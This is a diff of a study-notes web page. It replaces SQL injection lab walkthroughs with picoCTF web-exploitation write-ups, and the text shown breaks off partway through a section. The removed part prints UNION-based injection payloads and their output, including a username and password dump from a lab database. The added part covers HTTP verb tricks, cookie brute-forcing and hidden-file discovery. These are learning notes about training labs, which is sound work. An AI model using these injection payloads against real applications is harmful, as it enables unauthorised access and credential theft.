@@ -17,7 +17,7 @@
     
     
       
-        <title>SQL Injection - Study Notes</title>
+        <title>Web Exploitation - Study Notes</title>
       
     
     
@@ -68,7 +68,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#sql-injection" class="md-skip">
+        <a href="#web-exploitation" class="md-skip">
           Skip to content
         </a>
       
@@ -101,7 +101,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              SQL Injection
+              Web Exploitation
             
           </span>
         </div>
@@ -668,14 +668,12 @@
 
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
       
       
       
@@ -752,114 +750,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          SQL Injection
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="ps-sqi.html" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="ps-sqi.html" class="md-nav__link">
         SQL Injection
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#union-attack-determining-the-number-of-columns-returned-by-the-query" class="md-nav__link">
-     UNION attack, determining the number of columns returned by the query
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#union-attack-finding-a-column-containing-text" class="md-nav__link">
-     UNION attack, finding a column containing text
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sql-injection-union-attack-retrieving-data-from-other-tables" class="md-nav__link">
-     SQL injection UNION attack, retrieving data from other tables
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column" class="md-nav__link">
-     SQL injection UNION attack, retrieving multiple values in a single column
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sql-injection-attack-querying-the-database-type-and-version-on-oracle" class="md-nav__link">
-     SQL injection attack, querying the database type and version on Oracle
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#vulnerability-in-where-clause-allowing-retrieval-of-hidden-data" class="md-nav__link">
-     Vulnerability in WHERE clause allowing retrieval of hidden data
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#vulnerability-allowing-login-bypass" class="md-nav__link">
-     Vulnerability allowing login bypass
-  </a>
-  
-    <nav class="md-nav" aria-label=" Vulnerability allowing login bypass">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft" class="md-nav__link">
-    SQL injection attack, querying the database type and version on MySQL and Microsoft
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#sql-injection-attack-listing-the-database-contents-on-oracle" class="md-nav__link">
-    SQL injection attack, listing the database contents on Oracle
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -919,12 +814,14 @@
 
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" checked>
       
       
       
@@ -973,11 +870,276 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="pico-webex.html" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Web Exploitation
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="pico-webex.html" class="md-nav__link md-nav__link--active">
         Web Exploitation
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#get-ahead" class="md-nav__link">
+    GET aHEAD
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cookies" class="md-nav__link">
+    Cookies
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#insp3ct0r" class="md-nav__link">
+    Insp3ct0r
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scavenger-hunt" class="md-nav__link">
+    Scavenger Hunt
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#some-assembly-required-1" class="md-nav__link">
+    Some Assembly Required 1
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#more-cookies" class="md-nav__link">
+    More Cookies
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#where-are-the-robots" class="md-nav__link">
+    where are the robots
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#logon" class="md-nav__link">
+    logon
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dont-use-client-side" class="md-nav__link">
+    dont-use-client-side
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#it-is-my-birthday" class="md-nav__link">
+    It is my Birthday
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#who-are-you" class="md-nav__link">
+    Who are you?
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#login" class="md-nav__link">
+    login
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#some-assembly-required-2" class="md-nav__link">
+    Some Assembly Required 2
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#super-serial" class="md-nav__link">
+    Super Serial
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#most-cookies" class="md-nav__link">
+    Most Cookies
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#caas" class="md-nav__link">
+    caas
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#some-assembly-required-3" class="md-nav__link">
+    Some Assembly Required 3
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-gauntlet-2" class="md-nav__link">
+    Web Gauntlet 2
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#picobrowser" class="md-nav__link">
+    picobrowser
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#client-side-again" class="md-nav__link">
+    Client-side-again
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-gauntlet" class="md-nav__link">
+    Web Gauntlet
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#some-assembly-required-4" class="md-nav__link">
+    Some Assembly Required 4
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#x-marks-the-spot" class="md-nav__link">
+    X marks the spot
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#notepad" class="md-nav__link">
+    notepad
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#irish-name-repo-1" class="md-nav__link">
+    Irish-Name-Repo 1
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-gauntlet-3" class="md-nav__link">
+    Web Gauntlet 3
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jauth" class="md-nav__link">
+    JAuth
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#irish-name-repo-2" class="md-nav__link">
+    Irish-Name-Repo 2
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#irish-name-repo-3" class="md-nav__link">
+    Irish-Name-Repo 3
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jawt-scratchpad" class="md-nav__link">
+    JaWT Scratchpad
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#java-script-kiddie" class="md-nav__link">
+    Java Script Kiddie
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#java-script-kiddie-2" class="md-nav__link">
+    Java Script Kiddie 2
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bithug" class="md-nav__link">
+    Bithug
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1086,71 +1248,233 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#union-attack-determining-the-number-of-columns-returned-by-the-query" class="md-nav__link">
-     UNION attack, determining the number of columns returned by the query
+  <a href="#get-ahead" class="md-nav__link">
+    GET aHEAD
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#union-attack-finding-a-column-containing-text" class="md-nav__link">
-     UNION attack, finding a column containing text
+  <a href="#cookies" class="md-nav__link">
+    Cookies
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#sql-injection-union-attack-retrieving-data-from-other-tables" class="md-nav__link">
-     SQL injection UNION attack, retrieving data from other tables
+  <a href="#insp3ct0r" class="md-nav__link">
+    Insp3ct0r
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column" class="md-nav__link">
-     SQL injection UNION attack, retrieving multiple values in a single column
+  <a href="#scavenger-hunt" class="md-nav__link">
+    Scavenger Hunt
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#sql-injection-attack-querying-the-database-type-and-version-on-oracle" class="md-nav__link">
-     SQL injection attack, querying the database type and version on Oracle
+  <a href="#some-assembly-required-1" class="md-nav__link">
+    Some Assembly Required 1
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#vulnerability-in-where-clause-allowing-retrieval-of-hidden-data" class="md-nav__link">
-     Vulnerability in WHERE clause allowing retrieval of hidden data
+  <a href="#more-cookies" class="md-nav__link">
+    More Cookies
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#vulnerability-allowing-login-bypass" class="md-nav__link">
-     Vulnerability allowing login bypass
-  </a>
-  
-    <nav class="md-nav" aria-label=" Vulnerability allowing login bypass">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft" class="md-nav__link">
-    SQL injection attack, querying the database type and version on MySQL and Microsoft
+  <a href="#where-are-the-robots" class="md-nav__link">
+    where are the robots
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#sql-injection-attack-listing-the-database-contents-on-oracle" class="md-nav__link">
-    SQL injection attack, listing the database contents on Oracle
+      
+        <li class="md-nav__item">
+  <a href="#logon" class="md-nav__link">
+    logon
   </a>
   
 </li>
-        
-      </ul>
-    </nav>
+      
+        <li class="md-nav__item">
+  <a href="#dont-use-client-side" class="md-nav__link">
+    dont-use-client-side
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#it-is-my-birthday" class="md-nav__link">
+    It is my Birthday
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#who-are-you" class="md-nav__link">
+    Who are you?
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#login" class="md-nav__link">
+    login
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#some-assembly-required-2" class="md-nav__link">
+    Some Assembly Required 2
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#super-serial" class="md-nav__link">
+    Super Serial
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#most-cookies" class="md-nav__link">
+    Most Cookies
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#caas" class="md-nav__link">
+    caas
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#some-assembly-required-3" class="md-nav__link">
+    Some Assembly Required 3
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-gauntlet-2" class="md-nav__link">
+    Web Gauntlet 2
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#picobrowser" class="md-nav__link">
+    picobrowser
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#client-side-again" class="md-nav__link">
+    Client-side-again
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-gauntlet" class="md-nav__link">
+    Web Gauntlet
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#some-assembly-required-4" class="md-nav__link">
+    Some Assembly Required 4
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#x-marks-the-spot" class="md-nav__link">
+    X marks the spot
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#notepad" class="md-nav__link">
+    notepad
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#irish-name-repo-1" class="md-nav__link">
+    Irish-Name-Repo 1
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-gauntlet-3" class="md-nav__link">
+    Web Gauntlet 3
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jauth" class="md-nav__link">
+    JAuth
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#irish-name-repo-2" class="md-nav__link">
+    Irish-Name-Repo 2
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#irish-name-repo-3" class="md-nav__link">
+    Irish-Name-Repo 3
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jawt-scratchpad" class="md-nav__link">
+    JaWT Scratchpad
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#java-script-kiddie" class="md-nav__link">
+    Java Script Kiddie
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#java-script-kiddie-2" class="md-nav__link">
+    Java Script Kiddie 2
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bithug" class="md-nav__link">
+    Bithug
+  </a>
   
 </li>
       
@@ -1168,166 +1492,117 @@
                 
 
 
-<h1 id="sql-injection">SQL Injection<a class="headerlink" href="#sql-injection" title="Permanent link">&para;</a></h1>
-<h2 id="union-attack-determining-the-number-of-columns-returned-by-the-query"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> UNION attack, determining the number of columns returned by the query<a class="headerlink" href="#union-attack-determining-the-number-of-columns-returned-by-the-query" title="Permanent link">&para;</a></h2>
-<div class="admonition question">
-<p class="admonition-title">Question</p>
-<p>This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.</p>
-<p>To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.</p>
+<h1 id="web-exploitation">Web Exploitation<a class="headerlink" href="#web-exploitation" title="Permanent link">&para;</a></h1>
+<h3 id="get-ahead">GET aHEAD<a class="headerlink" href="#get-ahead" title="Permanent link">&para;</a></h3>
+<p>This probably goes down as one of those "boy, did you make it harder than it should have been" activities.</p>
+<p>You are asked to find the flag hidden at <a href="http://mercury.picoctf.net:47967">http://mercury.picoctf.net:47967</a>.</p>
+<p>After a bit of benign poking around, I assumed that you need to use burp (or similar) to modify the requests, so I fired it up and started looking around. I had expected to find something in the headers taht would give the answer, but no joy. After fighting with this for too long, I broke down and looked at the first hint, which said something like <em>"maybe you have more than two choices"</em>. Score one for my lack of creativity. Looking at the page code again, I noticed that one option submitted a <code>GET</code> request and the other did a <code>POST</code> request.</p>
+<p>Great! All I need to do is loop through the valid HTTP verbs, and I'll be set. So, I captured a request in burp, sent it to the Repeater tool, modified the verb, and sent it... did it again for each verb (<code>GET</code>, <code>PUT</code>, <code>POST</code>, <code>PATCH</code>, <code>DELETE</code>) and, as you might guess... no joy. My creative thinking fails again. Finally, I tried <code>HEAD</code> (a guess, based on the title of the challenge) and, wouldn't you guess... bingo.</p>
+<p>I then stepped back to <code>curl</code> to see if I could have done it there, and ended up with this one-liner:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># -I (or --head) fetches the HTTP headers only. --&gt; this is the same as sending a HEAD verb</span>
+$ curl http://mercury.picoctf.net:47967 -I     
+HTTP/1.1 <span class="m">200</span> OK
+flag: picoCTF<span class="o">{</span>redacted_value<span class="o">}</span>
+Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</code></pre></div>
+<h3 id="cookies">Cookies<a class="headerlink" href="#cookies" title="Permanent link">&para;</a></h3>
+<p>Need to try to figure out the "best" cookie from <a href="http://mercury.picoctf.net:27177">http://mercury.picoctf.net:27177</a></p>
+<p>So, the purpose of this challenge is really to ensure you know how to use Burp Suite's Intruder tool, or something similar. After poking around a bit with valid cookie names, you will notice that upon finding a valid cookie, the user is directed to <a href="http://mercury.picoctf.net:27177/check">http://mercury.picoctf.net:27177/check</a> with a cookie value of <code>name=,some_int&gt;</code>. The value of <code>&lt;some_int&gt;</code> changes based on the cookie name, and appears to be a lookup value of some sort. </p>
+<p>If you configure Intruder to use a sequential numerical payload that goes from say, <code>1</code> to <code>50</code> in steps of <code>1</code> and then run the attack, you'll see that the length property of the response for <code>18</code> is different than the rest. Inspecting the returned html will show you the key.</p>
+<div class="admonition hint">
+<p class="admonition-title">Hint</p>
+<p>A helpful link found while working on this challenge is <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a> which provides word lists and various payloads for different situations</p>
 </div>
-<p>What we know:</p>
+<h3 id="insp3ct0r">Insp3ct0r<a class="headerlink" href="#insp3ct0r" title="Permanent link">&para;</a></h3>
+<p>We are encouraged to inspect the following URL: <a href="https://jupiter.challenges.picoctf.org/problem/9670/">https://jupiter.challenges.picoctf.org/problem/9670/</a> </p>
+<p>Upon viewing the source, we quickly see &#8531;rd of the key in the comment string at the bottom: <code>picoCTF{tru3_d3</code> ... now to find the remaining &#8532;rds.  Poking around at the downloaded JS file <code>myjs.js</code>, we see the end of the flag: <code>_lucky?2e7b23e3}</code>. All we are missing now is the middle part... Thinking ever so little, we assume that we can go to the only other referenced file (<code>mycss.css</code>) and find the middle part of the key, which we do: <code>t3ct1ve_0r_ju5t</code></p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>for what it is worth, I found this to be a very easy "challenge", and more on the lines of a 10 point challenge than the two prior ones...</p>
+</div>
+<h3 id="scavenger-hunt">Scavenger Hunt<a class="headerlink" href="#scavenger-hunt" title="Permanent link">&para;</a></h3>
+<p>We are asked to find the interesting information hidden here: <a href="http://mercury.picoctf.net:39491/">http://mercury.picoctf.net:39491/</a></p>
 <ul>
-<li>vulnerability in product category filter</li>
-<li>should be able to use UNION attack to see data from other tables</li>
-<li>first step is to see number of columns being returned by the query</li>
+<li>looking at the page source, we find <code>picoCTF{t</code></li>
+<li>looking at the css source we find <code>h4ts_4_l0</code></li>
+<li>looking at the JS source, we find a hint... <code>/* How can I keep Google from indexing my website? */</code> which points us to <code>robots.txt</code></li>
+<li>looking at <code>robots.txt</code>, we find <code>t_0f_pl4c</code> as well as a hint that this is an apache server</li>
+<li>looking at <code>.htaccess</code> (clearly a mis-configured apache server), we find <code>3s_2_lO0k</code>. We also see that this was built on a mac and that we can store alot of info there.</li>
+<li>looking at <code>.DS_Store</code>, we find the last portion: <code>_f7ce8828}</code></li>
 </ul>
-<p><a href="https://acd21fe61eb0074fc0b23b47009700b8.web-security-academy.net/filter?category=Pets">https://acd21fe61eb0074fc0b23b47009700b8.web-security-academy.net/filter?category=Pets</a></p>
-<p>The first approach to determining how many columns is to do the <code>ORDER BY</code> trick with increasing numbers until you get an error. We do that and see that it errors on <code>4</code>, indicating that three columns are being returned:</p>
-<div class="highlight"><pre><span></span><code>/filter?category=Pets&#39; ORDER BY 1 --
-/filter?category=Pets&#39; ORDER BY 2 --
-/filter?category=Pets&#39; ORDER BY 3 --
-/filter?category=Pets&#39; ORDER BY 4 -- (error)
+<h3 id="some-assembly-required-1">Some Assembly Required 1<a class="headerlink" href="#some-assembly-required-1" title="Permanent link">&para;</a></h3>
+<p>No description provided, no hints provided, just this url: <code>http://mercury.picoctf.net:26318/index.html</code>. Once you get there, you have a form that says "enter flag" with a submit button.</p>
+<p>After noodling around a little, this challenge looks like an introduction to <a href="https://webassembly.org">Web Assembly</a></p>
+<p>As I normally do, I spent way too much time trying to unravel the JS code here (mild obfuscation) only to realize that I was missing the really obvious piece... the following is the magic line:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">_0x5f0229</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">_0x48c3be</span><span class="p">(</span><span class="mf">489</span><span class="p">)),</span><span class="w"></span>
 </code></pre></div>
-<p>The second approach (and the one required for solving this lab) is to use the <code>UNION SELECT NULL</code> trick with the selected number of NULL columns. Based on the information gained in the first approach, we craft the following query/filter and solve the challenge:</p>
-<div class="highlight"><pre><span></span><code>/filter?category=Pets&#39; UNION SELECT NULL, NULL, NULL --
-</code></pre></div>
-<h2 id="union-attack-finding-a-column-containing-text"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> UNION attack, finding a column containing text<a class="headerlink" href="#union-attack-finding-a-column-containing-text" title="Permanent link">&para;</a></h2>
-<div class="admonition question">
-<p class="admonition-title">Question</p>
-<p>This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.</p>
-<p>The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.</p>
-</div>
-<p>Given:</p>
-<ul>
-<li>SQL injection vuln in the product category filter</li>
-<li>Should be able to do a union attack to pull data from other tables</li>
-<li>builds on previous lab</li>
-<li>need to identify a column that is compatible with string data</li>
-</ul>
-<blockquote>
-<p>Goal: perform the SQL Injection UNION attack, return additional row containing value provided: <code>S3HPlT</code>.</p>
-</blockquote>
-<p>We walk through the three fields looking for a match:</p>
-<div class="highlight"><pre><span></span><code>/filter?category=Pets&#39; UNION SELECT &#39;S3HPlT&#39;,NULL,NULL-- (internal server error)
-/filter?category=Pets&#39; UNION SELECT NULL,&#39;S3HPlT&#39;,NULL-- (success!)
-/filter?category=Pets&#39; UNION SELECT NULL,&#39;S3HPlT&#39;,NULL-- (internal server error)
-</code></pre></div>
-<p>And we can see that the second attempt solved the challenge - we now know that the query is returning 3 columns and the second is compatible with string data.</p>
-<h2 id="sql-injection-union-attack-retrieving-data-from-other-tables"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> SQL injection UNION attack, retrieving data from other tables<a class="headerlink" href="#sql-injection-union-attack-retrieving-data-from-other-tables" title="Permanent link">&para;</a></h2>
-<div class="admonition question">
-<p class="admonition-title">Question</p>
-<p>This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.</p>
-<p>The database contains a different table called users, with columns called username and password.</p>
-<p>To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.</p>
-</div>
-<p>Building on prior solutions, we wnt to retrieve data from other tables. We are told that there is another table called <code>users</code> that has a column named <code>username</code> and another called <code>password</code>. Note that this is easier than the above as we don't have to shove things into one column (yet).</p>
-<div class="highlight"><pre><span></span><code>/filter?category=Pets&#39; UNION select username, password from users --
-</code></pre></div>
-<p>yields us information like the following:</p>
-<div class="highlight"><pre><span></span><code>The Lazy Dog
-
-The Lazy Dog is brought to you by the same people who invented the...
-
-carlos
-
-934rdmfpigx806kxma0m
-
-administrator
-
-734gs039pp7hvz53glwk
-
-wiener
-
-6yfdkdcuexrs36a2nd2a
-</code></pre></div>
-<p>We can then take this information and log in as the administrator account.</p>
-<h2 id="sql-injection-union-attack-retrieving-multiple-values-in-a-single-column"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> SQL injection UNION attack, retrieving multiple values in a single column<a class="headerlink" href="#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column" title="Permanent link">&para;</a></h2>
-<div class="admonition question">
-<p class="admonition-title">Question</p>
